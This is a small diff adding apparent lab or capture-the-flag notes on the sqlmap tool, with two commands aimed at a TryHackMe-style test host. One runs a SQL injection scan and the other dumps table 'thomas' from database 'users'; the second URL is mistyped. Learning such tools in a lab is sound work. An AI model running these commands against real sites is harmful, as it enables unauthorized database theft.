@@ -1,0 +1,5 @@
+### SqlMAP
+sqlmap -u http://sqlmaptesting.thm/search/cat=1
+
+user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
+
